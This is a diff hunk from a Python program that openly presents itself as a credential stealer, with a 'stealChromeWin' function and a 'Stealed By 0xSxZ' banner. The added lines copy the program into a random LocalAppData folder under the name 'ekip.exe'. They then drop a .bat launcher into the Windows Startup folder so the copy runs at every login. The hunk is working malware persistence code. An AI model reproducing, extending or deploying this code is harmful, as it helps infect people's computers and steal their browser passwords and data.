@@ -162,17 +162,19 @@ if yes == "yes":
 		IP = str(uuid.uuid4())
 		city = str(uuid.uuid4())
 		country = str(uuid.uuid4())
-
 	def add_to_startup(file_path=""):
-		 if file_path == "":
-			  file_path = os.path.dirname(os.path.realpath(__file__)) +"\\"+ sys.argv[0]
-		 bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
-		 with open(bat_path + '\\' + str(uuid.uuid4()) + ".bat", "w+") as bat_file:
-			  bat_file.write(r'start "" "%s"' % file_path)
-
+		copyof_file = str(uuid.uuid4()) 
+		os.system("mkdir " + local_appdata + copyof_file)
+		copyof_file = local_appdata + copyof_file + "\\ekip.exe"
+		shutil.copy(os.path.realpath(__file__), copyof_file)
+		print(copyof_file)
+		if file_path == "":
+			file_path = copyof_file
+		bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
+		with open(bat_path + '\\' + str(uuid.uuid4()) + ".bat", "w+") as bat_file:
+			bat_file.write(r'start "" "%s"' % file_path)
 	if(platform.system() == 'windows' or platform.system() == "Windows"):
-		for i in range(PROCESS_NUM):
-			add_to_startup()
+		add_to_startup()
 	def stealChromeWin():
 		try:
 			res =  """Stealed By 0xSxZ ------------> \n\n"""
